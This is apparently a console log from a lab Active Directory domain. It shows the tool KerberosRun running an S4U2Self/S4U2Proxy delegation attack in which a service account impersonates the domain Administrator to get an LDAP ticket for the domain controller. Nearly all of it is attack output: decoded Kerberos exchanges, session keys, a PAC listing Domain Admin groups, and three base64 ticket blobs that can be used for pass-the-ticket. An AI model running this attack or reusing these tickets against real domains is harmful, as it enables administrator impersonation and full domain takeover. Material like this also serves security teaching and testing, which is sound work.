```powershell
PS C:\Users> .\KerberosRun.exe --s4u --user spnuseraes --pass [...] --impersonateuser administrator --spn ldap/dc1.corplab.local --verbose                                             
   __           __
  / /_____ ____/ /  ___ _______  ___ ______ _____
 /  '_/ -_) __/ _ \/ -_) __/ _ \(_-</ __/ // / _ \
/_/\_\\__/_/ /_.__/\__/_/  \___/___/_/  \_,_/_//_/

  v1.0.0
[*] Starting Kerberos Authentication ...
[*] Sending AS-REQ ...
    * MessageType :  KRB_AS_REQ
    * pvno :  5
    * PaData :
       - PA_PAC_REQUEST :
          - IncludePac :  True
    * Body :
       - KdcOptions :  RenewableOk, Canonicalize, Renewable, Forwardable
       - CName :
          - Type :  NT_PRINCIPAL
          - Name :  spnuseraes
       - Realm :  CORPLAB.LOCAL
       - SName :
          - Type :  NT_SRV_INST
          - Name :  krbtgt
          - Name :  CORPLAB.LOCAL
       - Till :  9/13/2037 2:48:05 AM +00:00
       - RTime :  9/13/2037 2:48:05 AM +00:00
       - Nonce :  637261656
       - EType :
          - EncType :  AES256_CTS_HMAC_SHA1_96
          - EncType :  AES128_CTS_HMAC_SHA1_96
          - EncType :  RC4_HMAC_NT
          - EncType :  RC4_HMAC_NT_EXP
          - EncType :  RC4_HMAC_OLD_EXP
       - Addresses :
          - Type :  NetBios
          - Addresses :  ADMINSTAT
       - AdditionalTickets :
       - EncAuthorizationData :
       - From :
[x] Kerberos Error: KDC KDC_ERR_PREAUTH_REQUIRED: Additional pre-authentication required
[*] Adding encrypted timestamp ...
[*] Sending AS-REQ ...
    * MessageType :  KRB_AS_REQ
    * pvno :  5
    * PaData :
       - PA_PAC_REQUEST :
          - IncludePac :  True
       - PA_ENC_TIMESTAMP :
          - EType :  AES256_CTS_HMAC_SHA1_96
          - kvno :
          - Cipher :  [ClientEncryptedTimestamp...]
          - PaTimestamp :  5/27/2020 8:39:14 AM +00:00
          - PaUSec :  825
    * Body :
       - KdcOptions :  RenewableOk, Canonicalize, Renewable, Forwardable
       - CName :
          - Type :  NT_PRINCIPAL
          - Name :  spnuseraes
       - Realm :  CORPLAB.LOCAL
       - SName :
          - Type :  NT_SRV_INST
          - Name :  krbtgt
          - Name :  CORPLAB.LOCAL
       - Till :  9/13/2037 2:48:05 AM +00:00
       - RTime :  9/13/2037 2:48:05 AM +00:00
       - Nonce :  637261657
       - EType :
          - EncType :  AES256_CTS_HMAC_SHA1_96
          - EncType :  AES128_CTS_HMAC_SHA1_96
          - EncType :  RC4_HMAC_NT
          - EncType :  RC4_HMAC_NT_EXP
          - EncType :  RC4_HMAC_OLD_EXP
       - Addresses :
          - Type :  NetBios
          - Addresses :  ADMINSTAT
       - AdditionalTickets :
       - EncAuthorizationData :
       - From :
[*] Receiving AS-REP...
    * MessageType :  KRB_AS_REP
    * pvno :  5
    * PaData :
       - PA_ETYPE_INFO2 :
          - EType :  AES256_CTS_HMAC_SHA1_96
          - S2kParams :
          - Salt :  CORPLAB.LOCALspnuseraes
    * CRealm :  CORPLAB.LOCAL
    * CName :
       - Type :  NT_PRINCIPAL
       - Name :  spnuseraes
    * Ticket :
       - tkt-vno :  5
       - Realm :  CORPLAB.LOCAL
       - SName :
          - Name :  krbtgt
          - Type :  NT_SRV_INST
       - EncryptedPart :
          - kvno :  11
          - EType :  AES256_CTS_HMAC_SHA1_96
          - Cipher :  [krbtgtEncryptedCipher...]
    * Enc-Part :
       - kvno :  4
       - EType :  AES256_CTS_HMAC_SHA1_96
       - Cipher :  [ClientEncryptedCipher...]
    * [Decrypted Enc-Part]:
       - AuthTime :  5/27/2020 8:39:15 AM +00:00
       - StartTime :  5/27/2020 8:39:15 AM +00:00
       - EndTime :  5/27/2020 6:39:15 PM +00:00
       - RenewTill :  6/3/2020 8:39:15 AM +00:00
       - Nonce :  637261657
       - Realm :  CORPLAB.LOCAL
       - SName :
          - Type :  NT_SRV_INST
          - Name :  krbtgt
          - Name :  CORPLAB.LOCAL
       - EncryptedPaData :
          - PA_SUPPORTED_ETYPES :
             - Value : 1F000000
       - Key :
          - EType :  AES256_CTS_HMAC_SHA1_96
          - Value :  63121C531C7D0F825A848F460FA965F7998B43F55075B3E675D5BC420D0DDEAB
       - KeyExpiration :  9/14/2037 2:48:05 AM +00:00
       - CAddr :
          - Type :  NetBios
          - Addresses :  ADMINSTAT
       - Flags :  EncryptedPreAuthentication, PreAuthenticated, Initial, Renewable, Forwardable
       - LastReq
          - Type :  0
          - Type :  5/27/2020 8:39:15 AM +00:00
[+] TGT Kirbi:
    - doIFHDCCBRigAwIBBaEDAgEWooIEHDCCBBhhggQUMIIEEKADAgEFoQ8bDUNPUlBMQUIuTE9DQUyiIjAgoAMCAQKhGTAXGwZrcmJ0Z3QbDUNPUlBMQUIuTE9DQUyjggPSMIIDzqADAgESoQMCAQuiggPABIIDvDxI+yYhc1dDgzcMyCAvUMxZ0nPIbsohGb1lTRBJCN4copojqrKAJ6hlXg88Owx8RiLgl9oG2LRGHNHNs/qKKVYvNogwmUBXNVVPOWPJhNPMsM+dMoxIaVGGvcCEwsNkmXPlMPFUGbwef0KJFjwV1xfdHfIFltd6J+BUmc7Ky7Z0KT8dHv4RsJAt0yQiIH2JS+ygOdgR5ZqNVCRK600y9VF8ybq1r1lRGCaiCYiajhZVYxZPzSpZgAl/2FMG+FCUhy0D4fPwcKvOYiH01AzmV7sxnFbQnk50SGFDiMyei5xb1C6sgf+soNKnoAX9CDfNcUUbx19i04PxROuRvdQfsLScfTQR4s4GMvX+CE+ZmqumO2rCpkQyvdAqILBsBLTIlrBBZT6nv+6pk+2e8PKv5C38GHqPrxUDoX2FmlNCO904cyc5osntcGUvxgIwzGd75zglxzPOeG5n3J8InAMkCE/6gLO5Vj4kdf3hDJKRGpB0mt8TEoJJ6c7cm1I/a/qrYT7ZrSQpWlDsdm89SuBRzuhg+NVlDxHEYeVujpXI+DjsZOTGl90E98IcKmQFbY8FxA4fytY5wwheIxOqkKIaA20ZBj5TBX+0mqgjKOcKCWqrgOgfemxfKdchaO6Fqgecy2cVk/B5VCJZae8KDzUVUmae1xr5UOX5j9UUJzG/CNeYGQtluOLjEWh3OlOoWExkhLbGuq2oM8Q6nnnUlubmh4tpKI4FEdTqmKBwiZvCPFAnYJvPtwxfaeEHU6K369gi4bwqbPKRRRMBGIoH8mnHot75zX+Lt46wU15q9w6WJ7Q+L/rhnrfY2XANJARAaWbm5VCDq0qvTt23JjRsj7AgKMxxhctlB1Wc+X2JD1n+lpHx6m6oV/MYhgF4nZ254UW36UYDtkzKuGKSZzalF5SinMN9J6t2WMoByatiFvWsYMulX5INeaHeNM3lKhKrE3aSR3VgI8bMi2VvHVB1y0hw6fF2ZTzSskpvoOuYmzbKBkxPnlWd/CcW4SFvKksBGHjVxAu/lnIYowWe1WAlcgRhPbblPO+el7CD6nHRp+ZXsCWMg4CA3PXVJIRSfp6rUTR8AfZVaSCQ7btiaZxjp2d9MlWwEutrv2FuUk/Zhx1xycvKgU2TiFdf7eH2C2+Zy/CAx3AARvgiWp0yT/eCfJmzXHidFLF6Sezl5Zq6LdU3QkOzPUmbFC7gqyzqPhkC4FuLpMdUgYFV9XLOWA2COim4ixUy26L/wH/RHEPP8WZWW2ss2yke9eMf2/fHuNZXo4HrMIHooAMCAQCigeAEgd19gdowgdeggdQwgdEwgc6gKzApoAMCARKhIgQgYxIcUxx9D4JahI9GD6ll95mLQ/VQdbPmddW8Qg0N3quhDxsNQ09SUExBQi5MT0NBTKIXMBWgAwIBAaEOMAwbCnNwbnVzZXJhZXOjBwMFAEDhAAClERgPMjAyMDA1MjcwODM5MTVaphEYDzIwMjAwNTI3MTgzOTE1WqcRGA8yMDIwMDYwMzA4MzkxNVqoDxsNQ09SUExBQi5MT0NBTKkiMCCgAwIBAqEZMBcbBmtyYnRndBsNQ09SUExBQi5MT0NBTA==
[*] Sending TGS-REQ [S4U2Self] ...
    * MessageType :  KRB_TGS_REQ
    * pvno :  5
    * PaData :
       - PA_TGS_REQ :
          - KRB_AP_REQ :
             - pvno :  5
             - ApOptions :  Reserved
             - Ticket :
                - tkt-vno :  5
                - Realm :  CORPLAB.LOCAL
                - SName :
                   - Type :  NT_SRV_INST
                   - Name :  krbtgt
                   - Name :  CORPLAB.LOCAL
                - EncryptedPart :
                   - kvno :  11
                   - EType :  AES256_CTS_HMAC_SHA1_96
                   - Cipher :  [krbtgtEncryptedCipher...]
             - Authenticator :
                - kvno :
                - EType :  AES256_CTS_HMAC_SHA1_96
                - Realm :  CORPLAB.LOCAL
                - SequenceNumber :  637261659
                - Subkey :
                   - EType :  AES256_CTS_HMAC_SHA1_96
                   - KeyValue :  9EB98FD1C195A85E09D01F9B4D4C61DE9A9F12FC20565A2CEFCD67AE4021364D
                - CTime :  5/27/2020 8:39:15 AM +00:00
                - CuSec :  90
                - CName :
                   - Type :  NT_PRINCIPAL
                   - Name :  spnuseraes
                - Checksum :
                   - Type :  HMAC_SHA1_96_AES256
                   - Checksum :  5178163FB14DB2095283D269
                - AuthorizationData :
                - AuthenticatorVersionNumber :  5
       - PA_FOR_USER :
          - UserName :
             - Type :  NT_ENTERPRISE
             - Name :  administrator
          - UserRealm :  CORPLAB.LOCAL
          - AuthPackage :  Kerberos
          - Checksum :
             - Type :  KERB_CHECKSUM_HMAC_MD5
             - Checksum :  2D6DE2CBFDF408C0845BAAC16C1D4922
    * Body :
       - KdcOptions :  EncTktInSkey, RenewableOk, Renewable, Forwardable
       - Realm :  corplab.local
       - SName :
          - Type :  NT_PRINCIPAL
          - Name :  spnuseraes
       - Till :  9/13/2037 2:48:05 AM +00:00
       - RTime :
       - Nonce :  637261658
       - EType :
          - EncType :  AES256_CTS_HMAC_SHA1_96
          - EncType :  AES128_CTS_HMAC_SHA1_96
          - EncType :  RC4_HMAC_NT
          - EncType :  RC4_HMAC_NT_EXP
          - EncType :  RC4_HMAC_OLD_EXP
       - EncAuthorizationData :
       - From :
       - AdditionalTickets :
[*] Receiving TGS-REP [S4U2Self] ...
    * MessageType :  KRB_TGS_REP
    * pvno :  5
    * PaData :
    * CRealm :  CORPLAB.LOCAL
    * CName :
       - Type :  NT_ENTERPRISE
       - Name :  administrator
    * Ticket :
       - tkt-vno :  5
       - Realm :  CORPLAB.LOCAL
       - SName :
          - Name :  spnuseraes
          - Type :  NT_PRINCIPAL
       - EncryptedPart :
          - kvno :  4
          - EType :  AES256_CTS_HMAC_SHA1_96
          - Cipher :  [ServiceEncryptedCipher...]
    * Enc-Part :
       - EType :  AES256_CTS_HMAC_SHA1_96
       - kvno :
       - Cipher :  [SubSessionKeyEncryptedCipher..]
    * [Decrypted Enc-Part]:
       - AuthTime :  5/27/2020 8:39:15 AM +00:00
       - StartTime :  5/27/2020 8:39:15 AM +00:00
       - EndTime :  5/27/2020 6:39:15 PM +00:00
       - RenewTill :  6/3/2020 8:39:15 AM +00:00
       - Nonce :  637261658
       - Realm :  CORPLAB.LOCAL
       - SName :
          - Type :  NT_PRINCIPAL
          - Name :  spnuseraes
       - EncryptedPaData :
       - Key :
          - EType :  AES256_CTS_HMAC_SHA1_96
          - Value :  D9A94A6FD359710193DBDD0FF87DD672F217CA96413833D2C0B2095CF9F00DF2
       - KeyExpiration :
       - Flags :  EncryptedPreAuthentication, PreAuthenticated, Renewable
       - LastReq
          - Type :  0
          - Type :  5/27/2020 8:39:15 AM +00:00
    * [Decrypted Ticket Enc-Part]:
       - AuthTime :  5/27/2020 8:39:15 AM +00:00
       - StartTime :  5/27/2020 8:39:15 AM +00:00
       - EndTime :  5/27/2020 6:39:15 PM +00:00
       - RenewTill :  6/3/2020 8:39:15 AM +00:00
       - CRealm :  CORPLAB.LOCAL
       - CName :
          - Type :  NT_ENTERPRISE
          - Name :  administrator
       - AuthorizationData :
          - Type :  AdIfRelevant
             - Type :  AdWin2kPac
                - Type :  AdWin2kPac
                - Version :  0
                - LogonInfo :
                   - PacType :
                   - DomainId :
                      - Revision :  1
                      - IdentifierAuthority :  NTAuthority
                      - SubAuthority :  21, 1977317821, 1772133574, 954835042
                      - SubAuthorityCount :  4
                   - ExtraIds :
                      - Attributes :  SE_GROUP_MANDATORY, SE_GROUP_ENABLED_BY_DEFAULT, SE_GROUP_ENABLED
                      - Sid :  S-1-18-2
                      - Revision :  1
                      - IdentifierAuthority :  AuthenticationAuthority
                      - SubAuthority :  2
                      - SubAuthorityCount :  1
                   - DomainSid :
                      - Attributes :  0
                      - Id :  954835042
                      - Value :  S-1-5-21-1977317821-1772133574-954835042
                   - ExtraSidCount :  1
                   - ExtraSids :
                      - Id :  2
                      - Attributes :  0
                      - Value :  S-1-18-2
                   - GroupCount :  5
                   - GroupId :  513
                   - GroupIds :
                      - RelativeId :  512
                      - Attributes :  SE_GROUP_MANDATORY, SE_GROUP_ENABLED_BY_DEFAULT, SE_GROUP_ENABLED
                      - RelativeId :  513
                      - Attributes :  SE_GROUP_MANDATORY, SE_GROUP_ENABLED_BY_DEFAULT, SE_GROUP_ENABLED
                      - RelativeId :  520
                      - Attributes :  SE_GROUP_MANDATORY, SE_GROUP_ENABLED_BY_DEFAULT, SE_GROUP_ENABLED
                      - RelativeId :  518
                      - Attributes :  SE_GROUP_MANDATORY, SE_GROUP_ENABLED_BY_DEFAULT, SE_GROUP_ENABLED
                      - RelativeId :  519
                      - Attributes :  SE_GROUP_MANDATORY, SE_GROUP_ENABLED_BY_DEFAULT, SE_GROUP_ENABLED
                   - GroupSid :  S-1-5-21-1977317821-1772133574-954835042-513
                   - GroupSids :
                      - Id :  512
                      - Attributes :  SE_GROUP_MANDATORY, SE_GROUP_ENABLED_BY_DEFAULT, SE_GROUP_ENABLED
                      - Value :  S-1-5-21-1977317821-1772133574-954835042-512
                      - Id :  513
                      - Attributes :  SE_GROUP_MANDATORY, SE_GROUP_ENABLED_BY_DEFAULT, SE_GROUP_ENABLED
                      - Value :  S-1-5-21-1977317821-1772133574-954835042-513
                      - Id :  520
                      - Attributes :  SE_GROUP_MANDATORY, SE_GROUP_ENABLED_BY_DEFAULT, SE_GROUP_ENABLED
                      - Value :  S-1-5-21-1977317821-1772133574-954835042-520
                      - Id :  518
                      - Attributes :  SE_GROUP_MANDATORY, SE_GROUP_ENABLED_BY_DEFAULT, SE_GROUP_ENABLED
                      - Value :  S-1-5-21-1977317821-1772133574-954835042-518
                      - Id :  519
                      - Attributes :  SE_GROUP_MANDATORY, SE_GROUP_ENABLED_BY_DEFAULT, SE_GROUP_ENABLED
                      - Value :  S-1-5-21-1977317821-1772133574-954835042-519
                   - HomeDirectory :
                   - HomeDrive :
                   - KickOffTime :  1/1/0001 12:00:00 AM +00:00
                   - LastFailedILogon :  1/1/1601 12:00:00 AM +00:00
                   - LastSuccessfulILogon :  1/1/1601 12:00:00 AM +00:00
                   - LogoffTime :  1/1/0001 12:00:00 AM +00:00
                   - LogonCount :  144
                   - LogonScript :
                   - LogonTime :  5/27/2020 8:09:42 AM +00:00
                   - ProfilePath :
                   - PwdCanChangeTime :  5/20/2020 3:37:53 AM +00:00
                   - PwdLastChangeTime :  5/19/2020 3:37:53 AM +00:00
                   - PwdMustChangeTime :  1/1/0001 12:00:00 AM +00:00
                   - Reserved1 :  0, 0
                   - Reserved3 :  0
                   - ResourceDomainId :  S-1-5-21-1977317821-1772133574-954835042
                   - ResourceDomainSid :  S-1-5-21-1977317821-1772133574-954835042
                   - ResourceGroupCount :  1
                   - ResourceGroupIds :  System.Collections.Generic.List`1[Kerberos.NET.Entities.Pac.GroupMembership]
                   - ResourceGroups :
                      - Attributes :  SE_GROUP_MANDATORY, SE_GROUP_ENABLED_BY_DEFAULT, SE_GROUP_ENABLED, SE_GROUP_RESOURCE
                      - Id :  572
                      - Value :  S-1-5-21-1977317821-1772133574-954835042-572
                   - SubAuthStatus :  0
                   - UserAccountControl :  ADS_UF_LOCKOUT
                   - UserDisplayName :
                   - UserFlags :  LOGON_EXTRA_SIDS, LOGON_RESOURCE_GROUPS
                   - UserId :  500
                   - UserName :  Administrator
                   - UserSessionKey :  00000000000000000000000000000000
                   - UserSid :  S-1-5-21-1977317821-1772133574-954835042-500
                   - DomainName :  CORP
                   - ServerName :  DC1
                   - BadPasswordCount :  0
                   - FailedILogonCount :  0
                - ClientInformation :
                   - PacType :  CLIENT_NAME_TICKET_INFO
                   - ClientId :  5/27/2020 8:39:15 AM +00:00
                   - Name :  administrator
                   - NameLength :  26
                - KdcSignature :
                   - PacType :  0
                   - RODCIdentifier :  0
                   - Signature :  D4A5267BD2ED031BB92EFF09
                   - SignatureData :  [...]
                   - Type :  HMAC_SHA1_96_AES256
                   - Validated :  False
                   - Validator :
                      - Validator :  PaForUserChecksum
                      - Validator :  D4A5267BD2ED031BB92EFF09
                - ServerSignature :
                   - PacType :  0
                   - RODCIdentifier :  0
                   - Signature :  8FDF86EF566283E29F620450
                   - SignatureData :  [...]
                   - Type :  HMAC_SHA1_96_AES256
                   - Validated :  False
                   - Validator :
                      - Validator :  PaForUserChecksum
                      - Validator :  8FDF86EF566283E29F620450
                - UpnDomainInformation :
                   - PacType :  UPN_DOMAIN_INFO
                   - Upn :  Administrator@corplab.local
                   - UpnLength :  54
                   - UpnOffset :  16
                   - Domain :  CORPLAB.LOCAL
                   - DnsDomainNameLength :  26
                   - DnsDomainNameOffset :  72
                - DecodingErrors :
                - HasRequiredFields :  True
       - CAddr :
       - Flags :  EncryptedPreAuthentication, PreAuthenticated, Renewable
       - Key :
          - EType :  AES256_CTS_HMAC_SHA1_96
          - Value :  D9A94A6FD359710193DBDD0FF87DD672F217CA96413833D2C0B2095CF9F00DF2
       - Transited :
          - Type :  DomainX500Compress
          - Contents :
[+] TGS Kirbi:
    - doIFbDCCBWigAwIBBaEDAgEWooIEdDCCBHBhggRsMIIEaKADAgEFoQ8bDUNPUlBMQUIuTE9DQUyiFzAVoAMCAQGhDjAMGwpzcG51c2VyYWVzo4IENTCCBDGgAwIBEqEDAgEEooIEIwSCBB90w8gOCVI9ALldQaJ3xkObyV6UFqBCP7rrw6Bp0VajksVP8CpTN9bE2ZvbmzqxuHNknr0ks0G39Z3/QNE9j3bJx4dAf1U2RrYnibG3uf2WwM+gTiCO1XZtCeT+upixWvS0fLeJmaPEiSP263AOp9jEU5F5ckyKLY2/oJfLjKMiOVCfg7llrDcqBdM0M7F/QbQ93BMZ4q0eXAY+5RJcbvppCM/emYPRVYxwXwqcaS1hOCUdCJ9Llrd2DqGPDgQj6Lk6dd6XIkVm1Pm2QkZCeKFdtUka5lovX06TkFf7C7jgTl7F3Aq+HmYOX39rinawj0MZZ375W8Wof4GhG0qPEZr1PY5UP9xlANM12EenVSdQIfeyl+V3eg7kJ8oYA1kXlOg8cSi92k9KiGm4R8nPa5l2eWifMoax9YpW39WmI6lWnxIE1zKu/Pm1tjGtgqu9RRta7eRwsPHIFe945zwEwU+rmMV0Ox9A4J06Wn918KJrbu//R5d8iqFx2fjrs6hijNOLNMOTtKbtU8yr5t8FJ07nRW2JdJQlZVulydlk4H3qTKfkextRKOj25HAJ7MfS00QBl82m5jLkPRpY0RIJ40+FSaUnblxWNkz/ZzqQvc+XevSnFB4YHbjexVl+0kczEjUeKlH7DxmsMlUjsQ85682pkZmq+xw70aean5zC57OWGE2wRNDyXIKVmeE2FUpMsF0J4jjMna3MphdfFYAIe9ysPfrRWSCY4dgZ4IzoZzwC62HxLZvdAIGu9CPthjqNhnnJtGw+eEtVxwbxOe70DaheX8mlI9buU5NEqD8BKj40eyrVlrAlSI6ie4JAG0CQAqnEUCrtTmycsBkHzRumUlXBdnRjUuKEIFxbSCTmQj7EtG1qzVVeSZX1EfwqjdnBcpdIctj/jDEunGBKEEzfJhJLKY4QA1IHt/+7UGz93Kfv8RAp3AUHbVwJaf433lUIFkOQOl5wL8OLsThWEUP9nmM1RoBOJeaUQTVnX0VtikBhr9rvMV+38fLxAB0NOYnHWN1QvBgYiST6jTef9IplS1EDPsBgrGFNftQFyEZFadNKbm8rs8mahHkNZfTEKenilEeqp+ShREvB0ZdWz8q3ffZLWwkpnFHhsMSkgRiEq6LVEI/TUySx+/gBXsJK3SRqifemHdG/eLUfTsH0oJ4x0quufSz2BzMlUMjcQuFb+bYCGlvlUIwgz8v5oJYa1WrfcYgaVmWZJmP/43FiEY8xSbIr66zdNav3I0X4y1CJwtqqSw+OKUA++ys8Ljqfxkbz8wjfWWQx3za1v6RNKQOc+oQbpNTtNYG+5qO/b98dRbGEim8qq0hPQruFxwm6tS2YKSYLzRGrb8RbW33I+8TPRV7cD9ank4aKxPXFkYTv6GFEHbaa+Qc8DLP5l5MlTHtC2aOB4zCB4KADAgEAooHYBIHVfYHSMIHPoIHMMIHJMIHGoCswKaADAgESoSIEINmpSm/TWXEBk9vdD/h91nLyF8qWQTgz0sCyCVz58A3yoQ8bDUNPUlBMQUIuTE9DQUyiGjAYoAMCAQqhETAPGw1hZG1pbmlzdHJhdG9yowcDBQAAoQAApREYDzIwMjAwNTI3MDgzOTE1WqYRGA8yMDIwMDUyNzE4MzkxNVqnERgPMjAyMDA2MDMwODM5MTVaqA8bDUNPUlBMQUIuTE9DQUypFzAVoAMCAQGhDjAMGwpzcG51c2VyYWVz
[*] Sending TGS-REQ [S4U2Proxy] ...
    * MessageType :  KRB_TGS_REQ
    * pvno :  5
    * PaData :
       - PA_TGS_REQ :
          - KRB_AP_REQ :
             - pvno :  5
             - ApOptions :  Reserved
             - Ticket :
                - tkt-vno :  5
                - Realm :  CORPLAB.LOCAL
                - SName :
                   - Type :  NT_SRV_INST
                   - Name :  krbtgt
                   - Name :  CORPLAB.LOCAL
                - EncryptedPart :
                   - kvno :  11
                   - EType :  AES256_CTS_HMAC_SHA1_96
                   - Cipher :  [krbtgtEncryptedCipher...]
             - Authenticator :
                - kvno :
                - EType :  AES256_CTS_HMAC_SHA1_96
                - Realm :  CORPLAB.LOCAL
                - SequenceNumber :  637261661
                - Subkey :
                   - EType :  AES256_CTS_HMAC_SHA1_96
                   - KeyValue :  C63DC6F032F6FE1D673F32166377B3F0C7908DAB3425FDD49E313997FB4C254D
                - CTime :  5/27/2020 8:39:15 AM +00:00
                - CuSec :  512
                - CName :
                   - Type :  NT_PRINCIPAL
                   - Name :  spnuseraes
                - Checksum :
                   - Type :  HMAC_SHA1_96_AES256
                   - Checksum :  4EB87A9E16524D72C6F71B95
                - AuthorizationData :
                - AuthenticatorVersionNumber :  5
       - PA_PAC_OPTIONS :
          - Flags :  ResourceBasedConstrainedDelegation
    * Body :
       - KdcOptions :  RenewableOk, CNameInAdditionalTicket, ConstrainedDelegation, Renewable, Forwardable
       - Realm :  corplab.local
       - SName :
          - Type :  NT_SRV_INST
          - Name :  ldap
          - Name :  dc1.corplab.local
       - Till :  9/13/2037 2:48:05 AM +00:00
       - RTime :
       - Nonce :  637261660
       - EType :
          - EncType :  AES256_CTS_HMAC_SHA1_96
          - EncType :  AES128_CTS_HMAC_SHA1_96
          - EncType :  RC4_HMAC_NT
          - EncType :  RC4_HMAC_NT_EXP
          - EncType :  RC4_HMAC_OLD_EXP
       - EncAuthorizationData :
       - From :
       - AdditionalTickets : (S4U2Self Ticket)
          - tkt-vno :  5
          - Realm :  CORPLAB.LOCAL
          - SName :
             - Name :  spnuseraes
             - Type :  NT_PRINCIPAL
          - EncryptedPart :
             - kvno :  4
             - EType :  AES256_CTS_HMAC_SHA1_96
             - Cipher :  [ServiceEncryptedCipher...]
[*] Receiving TGS-REP [S4U2Proxy] ...
    * MessageType :  KRB_TGS_REP
    * pvno :  5
    * PaData :
    * CRealm :  CORPLAB.LOCAL
    * CName :
       - Type :  NT_ENTERPRISE
       - Name :  administrator
    * Ticket :
       - tkt-vno :  5
       - Realm :  CORPLAB.LOCAL
       - SName :
          - Name :  ldap
          - Type :  NT_SRV_INST
       - EncryptedPart :
          - kvno :  7
          - EType :  AES256_CTS_HMAC_SHA1_96
          - Cipher :  [ServiceEncryptedCipher...]
    * Enc-Part :
       - EType :  AES256_CTS_HMAC_SHA1_96
       - kvno :
       - Cipher :  [SubSessionKeyEncryptedCipher..]
    * [Decrypted Enc-Part]:
       - AuthTime :  5/27/2020 8:39:15 AM +00:00
       - StartTime :  5/27/2020 8:39:15 AM +00:00
       - EndTime :  5/27/2020 6:39:15 PM +00:00
       - RenewTill :  6/3/2020 8:39:15 AM +00:00
       - Nonce :  637261660
       - Realm :  CORPLAB.LOCAL
       - SName :
          - Type :  NT_SRV_INST
          - Name :  ldap
          - Name :  dc1.corplab.local
       - EncryptedPaData :
          - PA_PAC_OPTIONS :
             - Flags :  ResourceBasedConstrainedDelegation
       - Key :
          - EType :  AES256_CTS_HMAC_SHA1_96
          - Value :  17A6266461838F56F7B2B7A3C31ABD59ECED7B93FC4B8960CE9F8E32B08D4178
       - KeyExpiration :
       - Flags :  EncryptedPreAuthentication, OkAsDelegate, PreAuthenticated, Renewable, Forwardable
       - LastReq
          - Type :  0
          - Type :  5/27/2020 8:39:15 AM +00:00
[+] TGS Kirbi:
    - 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
[+] Done! Now enjoy your ticket for ldap/dc1.corplab.local.
```